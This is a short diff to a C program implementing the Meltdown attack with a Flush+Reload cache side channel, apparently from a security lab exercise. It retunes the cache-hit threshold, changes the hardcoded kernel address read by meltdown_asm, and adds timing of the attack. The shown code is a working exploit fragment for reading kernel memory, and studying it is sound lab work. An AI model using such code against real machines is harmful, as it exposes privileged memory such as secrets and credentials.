@@ -7,12 +7,12 @@
 #include <fcntl.h>
 #include <emmintrin.h>
 #include <x86intrin.h>
-
+#include <time.h>
 
 /*********************** Flush + Reload ************************/
 uint8_t array[256*4096];
 
-#define CACHE_HIT_THRESHOLD (250)
+#define CACHE_HIT_THRESHOLD (270)
 #define DELTA 1024
 
 void flushSideChannel()
@@ -76,7 +76,9 @@ int main()
 {
   int i, j, ret = 0;
   int k;
-
+  clock_t t_start,t_end;
+  
+  t_start = clock();
   // Register signal handler
   signal(SIGSEGV, catch_segv);
 
@@ -104,8 +106,7 @@ int main()
 	  for (j = 0; j < 256; j++) 
 		  _mm_clflush(&array[j * 4096 + DELTA]);
 
-		// meltdown_asm()中的参数是根据内核模块存放的地址决定的
-	  if (sigsetjmp(jbuf, 1) == 0) { meltdown_asm(0xffffffffc0b7b000+k); }
+	  if (sigsetjmp(jbuf, 1) == 0) { meltdown_asm(0xffffffffc0f5b000+k); }
 
 	  reloadSideChannelImproved();
     }
@@ -119,5 +120,7 @@ int main()
     //printf("The number of hits is %d\n", scores[max]);
   }
 
+  t_end = clock();
+  printf("The attack time :%lf\n",(double)(t_end-t_start) / CLOCKS_PER_SEC);
   return 0;
 }
